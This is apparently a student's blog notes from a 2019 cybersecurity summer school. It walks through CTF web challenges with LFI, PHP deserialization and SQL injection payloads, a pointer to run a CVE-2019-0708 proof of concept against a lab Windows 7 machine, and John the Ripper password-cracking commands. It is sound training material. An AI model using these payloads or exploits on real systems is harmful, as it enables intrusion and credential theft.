---
title: ECNU X 启明星辰 网络安全暑期学校记录
date: 2019-07-23 14:39:19
tags:
  - Kali
  - Hash
  - Javascript
  - 反序列化
  - RSA
  - SQLi
categories:
  - Web 安全
---

7.22-7.26，收获不大。

<!--more-->

## Day1 & Day2

概念介绍和比较基本的漏洞利用。

### 可能需要补的东西

- 协议 & 路由相关知识：TCP/IP 卷一，CCNA/CCNP 学习指导
- 安全技能证书
- PHP 代码审计工具
- PHP
- SQL
- 工具的使用
- ……

### CVE-2019-0708

获取脚本：[https://www.exploit-db.com/exploits/46946](https://www.exploit-db.com/exploits/46946)，命名为 `poc.py`。

在 Win7 靶机上开启 3389 端口（` 计算机 `->` 属性 `->` 远程设置 `->`允许所有...`），并通过 `ipconfig` 查看 IP。

最后终端运行：

```shell
$ python poc.py [靶机 IP 靶机位数]
```

其中靶机 IP 为上面获得的 IP，靶机位数为 32 或 64。

> 其余 CVE 利用过程都基于 MSF，比较套路。

## Day3

Web 方向。

### Level4

扫后台发现存在备份文件 `index.php.bak`，得 PHP 代码：

```php
<?php
ERROR_REPORTING(0);
if(!empty($_GET['ver'])==PHP_VERSION){

    if($_GET['ver']==PHP_VERSION){
        $key = "**********";
    }
}
?>
```

burp 抓包发现返回头中有 `X-Powered-By: PHP/5.4.41`，那么把 `ver=5.4.41` 作为参数通过 `GET` 请求发送即可。

### Level5

F12 在注释中发现存在 `password.txt`，查看发现是一个字典，放到 Intruder 里跑出密码为 `Nsf0cuS`，然后登录。不过前端有 js 限制了密码长度，修改 js 即可，或者也可以直接 Burp 发包。

登陆成功后，在 Set-Cookie 字段中发现 `newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;`，base64 解码得 `290bca70c7dae93db6644fa00b9d83b9.php`，访问。

在留言板界面任意留言并抓包，发现存在一个 `isLogin=0` 的 Cookie 和 `userlevel=guest` 的参数，分别修改为 `1` 和 `root` 即可。

### Level6

`240610708` 和 `QNKCDZO` 的 MD5 值相同。

### Level7

根据加密函数写解密程序 `decode.php`：

```php
<?php

function decode($s) {
  $_ = base64_decode(strrev(str_rot13($s)));
  $_o = '';
  for ($_0 = 0; $_0 < strlen($_); ++$_0) {
    $_c = substr($_, $_0, 1);
    $__ = ord($_c) - 1;
    $_c = chr($__);
    $_o .= $_c;
  }

  return strrev($_o);
}

echo decode($_GET['str']);
?>
```

然后本机开个服务器（我的是 8082 端口），`decode.php` 放在 `www` 目录里，访问 `http://localhost:8082/decode.php?str=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas` 即可。

### Level8

`check.js` 是 packer 加密，直接去掉 `eval` 放控制台跑一下得到 js 源码。

```js
_f = function () {
  var f = document.createElement("form");
  document.getElementById('login').appendChild(f);
  f.name = "login";
  return f
}();
_uname = function () {
  var uname = document.createElement("input");
  uname.type = "text";
  uname.id = "uname";
  uname.value = 'Input Username';
  uname.style.margin = "0px 0px 0px 60px";
  _f.appendChild(uname);
  uname.onfocus = function () {
    if (this.value =='Input Username') this.value =''
  };
  uname.onblur = function () {
    if (this.value =='') this.value ='Input Username'
  };
  return uname
}();
_br = function () {
  var br = document.createElement("br");
  _f.appendChild(br);
  br = document.createElement("br");
  _f.appendChild(br);
  return br
}();
_upass = function () {
  var upass = document.createElement("input");
  upass.type = "password";
  upass.id = "upass";
  upass.value = 'Input Password';
  upass.style.margin = "0px 0px 0px 60px";
  _f.appendChild(upass);
  upass.onfocus = function () {
    if (this.value =='Input Password') this.value =''
  };
  upass.onblur = function () {
    if (this.value =='') this.value ='Input Password'
  };
  return upass
}();
_btn = function () {
  var btn = document.createElement("input");
  _f.appendChild(btn);
  btn.type = "button";
  btn.value = "login";
  btn.onclick = function () {
    uname = document.getElementById('uname').value;
    upass = document.getElementById('upass').value;
    if (uname =="") alert('Please Input Username!');
    else if (upass =="") alert('Please Input Password!');
    else {
      eval(unescape("var%20strKey1%20%3D%20%22JaVa3C41ptIsAGo0DStAff%22%3B%0Avar%20strKey2%20%3D%20%22CaNUknOWThIsK3y%22%3B%0Avar%20strKey3%20%3D%20String.fromCharCode%2871%2C%2048%2C%20111%2C%20100%2C%2033%29%3B%0Aif%20%28uname%20%3D%3D%20%28strKey3%20+%20%28%28%28strKey1.toLowerCase%28%29%29.substring%280%2C%20strKey1.indexOf%28%220%22%29%29%20+%20strKey2.substring%282%2C%206%29%29.toUpperCase%28%29%29.substring%280%2C%2015%29%29%29%20%7B%0A%20%20%20%20var%20strKey4%20%3D%20%27Java_Scr1pt_Pa4sW0rd_K3y_H3re%27%3B%0A%20%20%20%20if%20%28upass%20%3D%3D%20%28strKey4.substring%28strKey4.indexOf%28%271%27%2C%205%29%2C%20strKey4.length%20-%20strKey4.indexOf%28%27_%27%29%20+%205%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Login%20Success%21%27%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27key%27%29.innerHTML%20%3D%20unescape%28%22%253Cfont%2520color%253D%2522%2523000%2522%253Ea2V5X0NoM2NrXy50eHQ%3D%253C/font%253E%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Password%20Error%21%27%29%3B%0A%20%20%20%20%7D%0A%7D%20else%20%7B%0A%20%20%20%20alert%28%27Login%20Failed%21%27%29%3B%0A%7D"))
    }
  };
  return false
}();
```

只有最后一个 `else` 里的代码比较重要，去掉 `eval` 运行得：

```js
var strKey1 = "JaVa3C41ptIsAGo0DStAff";
var strKey2 = "CaNUknOWThIsK3y";
var strKey3 = String.fromCharCode(71, 48, 111, 100, 33);
if (uname == (strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf("0")) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15))) {
    var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re';
    if (upass == (strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5))) {
        alert('Login Success!');
        document.getElementById('key').innerHTML = unescape("%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E");
    } else {
        alert('Password Error!');
    }
} else {
    alert('Login Failed!');
}
```

依次运行：
1.

```js
var strKey1 = "JaVa3C41ptIsAGo0DStAff";
var strKey2 = "CaNUknOWThIsK3y";
var strKey3 = String.fromCharCode(71, 48, 111, 100, 33);
var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re';
```

2.

```js
strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf("0")) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15)
```

3.

```js
strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5)
```

得到用户名 `G0od!JAVA3C41PTISAGO` 和密码 `1pt_Pa4sW0rd_K3y_H3re`，不过不用登录，因为 `key` 也可以直接得到。运行 `unescape("%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E")`，得到：

```html
<font color="#000">a2V5X0NoM2NrXy50eHQ=</font>
```

base64 解码得 `key_Ch3ck_.txt`，打开发现里面只有 `Ch3ck_Au7h.php`，但是打开发现只显示 `Your username error!`。因此我们 POST 刚才得到的用户名和密码。

### Level10

提示 LFI，并且 html 表单中有一个 `file` 参数，因此考虑用 PHP 伪协议，输入框中输入：

```
php://filter/read=convert.base64-encode/resource=index.php
```

flag 直接写死在源码中了。。

### Level11

存在备份文件 `index.php.swp`：

```php
function clear($string){
  // 这是过滤函数哦~
}


$userInfo = @unserialize($_REQUEST['userInfo']);

$query = 'SELECT * FROM users WHERE id = \''.clear($userInfo['id']).'\' AND password = \''.clear($userInfo['pass']).'\';';

$result = mysql_query($query);
if(!$result || mysql_num_rows($result) <1){
    die('Invalid password!');
}

$row = mysql_fetch_assoc($result);
foreach($row as $key => $value){
    $userInfo[$key] = $value;
}

$oldPass = @$_REQUEST['oldPass'];
$newPass = @$_REQUEST['newPass'];
if($oldPass == $userInfo['password']){
    $userInfo['password'] = $newPass;
    $query = 'UPDATE users SET pass = \''.clear($newPass).'\' WHERE id = \''.clear($userInfo['id']).'\';';
    mysql_query($query);
    echo 'Password Changed Success.<br>';
}
else{
    echo 'Invalid old password entered.';
}
```

首先对 `userInfo` 进行反序列化，随后要求两个参数 `oldPass` 和 `newPass`，后者随意设置，前者很容易得到。在 Cookie 中发现 `pass=OTA0OGM1MGUwOTJmM2IyZWRlYzM5NTFiZjdiZGFlNTA%3D; id=3`，进行 base64 解码和 md5 解密后得到 `oldPass=20151231`。

最后就是在 payload 中构造一个序列化的 userInfo 数组，payload:

```
changepassword.php?userInfo=a:2:{s:2:"id";i:1;s:4:"pass";s:8:"20151231";}&oldPass=20151231&newPass=11111111
```

### Level12

备份文件 `index.php.`：

```php
<?php
#GOAL: get password from admin;
error_reporting(0);

require 'DB_config_inc.php';

dvwaDatabaseConnect();

$_CONFIG['Security']=true;

//if register globals = on, undo var overwrites
foreach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){
     foreach($$method as $key=>$value){
          unset($$key);
     }
}

function clear($string){
    //filter function here

}

$username = isset($_POST['username']) ? clear($_POST['username']) : die('Please enter in a username.');
$password = isset($_POST['password']) ? clear($_POST['password']) : die('Please enter in a password.');

if($_CONFIG['Security']){
     $username=preg_replace('#[^a-z0-9_-]#i','',$username);
     $password=preg_replace('#[^a-z0-9_-]#i','',$password);

}

if (is_array($username)){
    foreach ($username as $key => $value) {
        $username[$key] = $value;
    }
}

$query='SELECT * FROM users WHERE user=\''.$username[0].'\' AND password=\''.$password.'\';';

$result=mysql_query($query);

if($result && mysql_num_rows($result) > 0){
    echo('flag:{*********}');
    exit();
}
else{
    echo("<script>alert(\"Invalid password!\")</script>");
    exit();
}
?>
```

如果 `$_CONFIG['security']` 为 `true`，那么我们无法传入 `username` 和 `password`，因此需要覆盖 `$_CONFIG`。随后就是注入了，payload:

```
username='&password=||1=1#&Submit=%E6%8F%90%E4%BA%A4&_CONFIG=aaa
```

### Level13

经测试，只有 `php5` 后缀的文件可以上传成功，但是经过一段很短的延时后又会被删掉。所以需要写两个脚本，一个上传一个下载同时进行，最后发现下载下来的刚才上传的文件里包含 flag。

## Day4 & Day5

练习赛，没来得及记录具体 writeup，靠回忆整理一点工具的使用。

### John 破解 DES

```bash
john des.txt
john --show des.txt
```

### John 破解 Windows 管理员密码

注：Windows 下散列函数为 NTLM。

```bash
john --format=NT sam.txt
```

### Python 库 Steganography 命令行使用

```bash
steganography -e input.jpg output.jpg 'flag{..}'
steganography -d stego.png
```

### F5-Steganography 使用

```bash
java Extract stego.jpg -p 123456
```

### steghide 使用

```bash
steghide embed -cf picture.jpg -ef secret.txt
steghide extract -sf picture.jpg
```

### 图片隐写压缩包 / 图片

```cmd
copy /b 1.jpg+1.zip new.jpg
copy /b 2.jpg+3.jpg 23.jpg
```

### RSA - 已知 p,q,e

如果只知道 n 且 n 位数不大，可以在线分解得 p,q。

```python
import gmpy2
p = ...
q = ...
e = ...
c = ... # c = pow(m, e, p*q)

d = gmpy2.invert(e, (p-1)*(q-1))
m = pow(c, d, p*q)
```

### Misc - 未知领域

例如对于流量包，vmdk 文件，apk 文件等等不熟悉的文件的分析，部分简单题可以通过文本编辑器打开并搜索字符串。对于损坏的流量包尤为有效。

### 哈希还原

给定明文范围和哈希前十个字符，求明文与哈希值。简陋的 php 版本：

```php
<?php
$str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$len = strlen($str);
for($i = 0; $i < $len-1; ++$i) {
  for($j = 0; $j < $len-1; ++$j) {
    for($k = 0; $k < $len-1; ++$k) {
      for($l = 0; $l < $len-1; ++$l) {
        $ret = md5($str[$i].$str[$j].$str[$k].$str[$l]);
        if(substr($ret, 0, 10) == 'c2979c7124') {
          echo $ret;
          die();
        }
      }
    }
  }
}
?>
```

比较舒服的 python 版本：

```python
import hashlib
import itertools

key = 'c2979c7124'
dir = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
dir_list = itertools.product(dir, repeat=4)
for i in dir_list:
    res = hashlib.md5(''.join(i)).hexdigest()
    if res[0:10] == key:
        print i
        print res
```

### SQL 注入流量包分析

1. 过滤出 http 数据包。
2. 定位关键的注入数据包所在的区间，观察注入语句判断是否是盲注。
3. 非盲注：关注响应信息，直接在响应信息中得到 flag。
4. 盲注：关注注入语句，导出 HTTP 对象到 txt 并写脚本分析出 flag。

## 总结

暑期学校主要还是面向零基础的同学，因此能学到的东西不算太多。接下来应该会重点学习各类工具的使用。